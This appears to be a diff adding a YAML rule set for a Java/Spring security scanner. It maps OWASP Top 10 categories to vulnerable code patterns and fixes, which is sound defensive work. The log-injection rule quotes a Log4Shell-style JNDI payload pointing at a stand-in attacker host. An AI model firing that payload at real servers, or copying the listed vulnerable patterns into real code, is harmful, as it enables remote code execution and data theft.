@@ -1,0 +1,187 @@
+rules:
+
+  # ── OWASP A01:2021 — Broken Access Control ────────────────────────────────
+
+  - id: BROKEN_ACCESS_CONTROL
+    owasp: "A01:2021"
+    severity: CRITICAL
+    description: >
+      Endpoints accessible without proper authorisation checks.
+      Patterns: missing @PreAuthorize / @Secured / @RolesAllowed on REST methods,
+      SecurityFilterChain rules that unintentionally permit all,
+      IDOR — using user-supplied IDs to fetch resources without ownership check,
+      forceful browsing to admin paths.
+    recommendation: >
+      Apply @PreAuthorize("hasRole('ROLE_X')") on every endpoint.
+      Validate resource ownership: assert entity.getOwner().equals(currentUser).
+      Use Spring Security method security consistently — never rely on URL patterns alone.
+
+  - id: PATH_TRAVERSAL
+    owasp: "A01:2021"
+    severity: HIGH
+    description: >
+      File path built from user input without sanitisation, allowing directory traversal.
+      Patterns: new File(baseDir + request.getParameter("file")),
+      Paths.get(userInput), FileInputStream(untrustedPath).
+    recommendation: >
+      Resolve and validate the canonical path: path.toRealPath().startsWith(allowedBase).
+      Never concatenate user input into file paths. Use an allowlist of permitted filenames.
+
+  # ── OWASP A02:2021 — Cryptographic Failures ───────────────────────────────
+
+  - id: SENSITIVE_DATA_EXPOSURE
+    owasp: "A02:2021"
+    severity: HIGH
+    description: >
+      Sensitive data (passwords, tokens, PII, credit cards) transmitted or stored
+      without adequate protection.
+      Patterns: HTTP (not HTTPS) URLs in RestTemplate/WebClient config,
+      passwords stored as plain text or weak hash (MD5, SHA1),
+      sensitive fields in API responses without masking,
+      PII written to logs.
+    recommendation: >
+      Enforce HTTPS everywhere. Use BCryptPasswordEncoder for passwords.
+      Annotate sensitive response fields with @JsonIgnore or @JsonProperty(access = WRITE_ONLY).
+      Never log passwords, tokens, SSNs, card numbers.
+
+  - id: HARDCODED_SECRETS
+    owasp: "A02:2021"
+    severity: CRITICAL
+    description: >
+      Credentials, API keys, tokens, or connection strings embedded in source code.
+      Patterns: password = "...", apiKey = "...", secretKey = "...",
+      jdbc:oracle:thin:user/pass@host, Authorization: "Bearer hardcoded...",
+      private static final String SECRET = "...".
+    recommendation: >
+      Use environment variables via @Value("${prop}") or Spring Cloud Config.
+      Rotate any key that was committed. Scan git history with trufflehog or gitleaks.
+
+  - id: WEAK_CRYPTOGRAPHY
+    owasp: "A02:2021"
+    severity: HIGH
+    description: >
+      Use of deprecated or weak cryptographic algorithms.
+      Patterns: MessageDigest.getInstance("MD5") or "SHA-1",
+      DES / 3DES / RC4 cipher usage, ECB mode for AES,
+      RSA key size < 2048, Math.random() for security-sensitive randomness.
+    recommendation: >
+      Use SHA-256+ for hashing. AES-256-GCM for symmetric encryption.
+      SecureRandom for all security-sensitive randomness. RSA >= 2048 bits.
+
+  # ── OWASP A03:2021 — Injection ────────────────────────────────────────────
+
+  - id: SQL_INJECTION
+    owasp: "A03:2021"
+    severity: CRITICAL
+    description: >
+      User input concatenated into SQL / JPQL queries without parameterisation.
+      Patterns: "SELECT ... WHERE name = '" + userInput + "'",
+      @Query with string concat, entityManager.createNativeQuery(rawSql),
+      Statement.execute(builtString).
+    recommendation: >
+      Use named parameters (:param) in @Query. JdbcTemplate with PreparedStatement.
+      Spring Data method naming. Never concatenate user input into query strings.
+
+  - id: LOG_INJECTION
+    owasp: "A03:2021"
+    severity: HIGH
+    description: >
+      Unsanitised user input written to logs, enabling log forgery, CRLF injection,
+      or Log4Shell-style JNDI lookup payloads (${jndi:ldap://attacker.com/x}).
+      Patterns: log.info("User: " + request.getParameter(...)),
+      logger.debug(userInput), log.warn("Path: " + request.getRequestURI()).
+    recommendation: >
+      Strip CR/LF: input.replaceAll("[\r\n]", "_").
+      Use SLF4J parameterised logging: log.info("User: {}", sanitise(input)).
+      Set -Dlog4j2.formatMsgNoLookups=true. Use structured logging (logstash-logback-encoder).
+
+  - id: COMMAND_INJECTION
+    owasp: "A03:2021"
+    severity: CRITICAL
+    description: >
+      OS commands constructed from user-supplied input.
+      Patterns: Runtime.getRuntime().exec("cmd " + userInput),
+      ProcessBuilder with unsanitised arguments,
+      using String.format to build shell commands.
+    recommendation: >
+      Never build OS commands from user input. If shell execution is necessary,
+      use ProcessBuilder with a fixed command array and pass user data as
+      separate arguments — never concatenate into the command string.
+      Validate and allowlist all inputs.
+
+  # ── OWASP A04:2021 — Insecure Design ─────────────────────────────────────
+
+  - id: MISSING_RATE_LIMITING
+    owasp: "A04:2021"
+    severity: MEDIUM
+    description: >
+      Authentication, password-reset, or sensitive endpoints without rate limiting,
+      allowing brute force or credential stuffing attacks.
+      Patterns: /login, /auth, /reset-password, /api/token endpoints with no
+      @RateLimiter annotation or Bucket4j / Resilience4j config.
+    recommendation: >
+      Apply Bucket4j or Resilience4j rate limiting to auth endpoints.
+      Lock accounts after N failed attempts. Return 429 with Retry-After header.
+
+  # ── OWASP A05:2021 — Security Misconfiguration ────────────────────────────
+
+  - id: SECURITY_MISCONFIGURATION
+    owasp: "A05:2021"
+    severity: HIGH
+    description: >
+      Insecure default configurations, unnecessary features enabled, or overly
+      permissive settings.
+      Patterns: CORS allowedOrigins("*") in production,
+      Spring Actuator endpoints exposed without auth (/actuator/env, /actuator/heapdump),
+      debug mode enabled (spring.jpa.show-sql=true in prod, server.error.include-stacktrace=always),
+      H2 console enabled in non-dev profiles,
+      permitAll() on sensitive URL patterns.
+    recommendation: >
+      Restrict CORS to known origins. Secure Actuator with Spring Security.
+      Use Spring profiles to disable debug config in production.
+      Enable server.error.include-stacktrace=never in prod.
+
+  - id: XML_EXTERNAL_ENTITY
+    owasp: "A05:2021"
+    severity: HIGH
+    description: >
+      XML parsers configured to process external entities, enabling XXE attacks
+      that can read local files or trigger SSRF.
+      Patterns: DocumentBuilderFactory without setFeature(DISALLOW_DOCTYPE),
+      SAXParserFactory without setFeature(EXTERNAL_GENERAL_ENTITIES, false),
+      JAXB / Jackson XML without XXE protection.
+    recommendation: >
+      Disable DOCTYPE declarations and external entities on all XML parsers.
+      Use Jackson's XmlMapper with JacksonXmlModule which is XXE-safe by default.
+
+  # ── OWASP A08:2021 — Software and Data Integrity Failures ─────────────────
+
+  - id: INSECURE_DESERIALIZATION
+    owasp: "A08:2021"
+    severity: HIGH
+    description: >
+      Deserialising untrusted data without type validation, enabling remote code execution.
+      Patterns: ObjectInputStream.readObject() on user-supplied bytes,
+      Jackson polymorphic typing (enableDefaultTyping()),
+      XStream without security framework,
+      Java serialisation of network-received objects.
+    recommendation: >
+      Avoid Java serialisation for network data. If required, use an allowlist filter
+      (ValidatingObjectInputStream). Disable Jackson default typing.
+      Use safer formats (JSON with schema validation) instead.
+
+  # ── OWASP A10:2021 — Server-Side Request Forgery ─────────────────────────
+
+  - id: SSRF
+    owasp: "A10:2021"
+    severity: HIGH
+    description: >
+      Server makes HTTP requests to a URL supplied or influenced by the user,
+      potentially reaching internal services or cloud metadata endpoints.
+      Patterns: RestTemplate.getForObject(userProvidedUrl, ...),
+      WebClient.get().uri(userInput),
+      URL url = new URL(request.getParameter("target")); url.openConnection().
+    recommendation: >
+      Validate URLs against an allowlist of permitted hosts/schemes before fetching.
+      Block requests to private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x).
+      Use a dedicated HTTP client with a timeout and no redirect following.
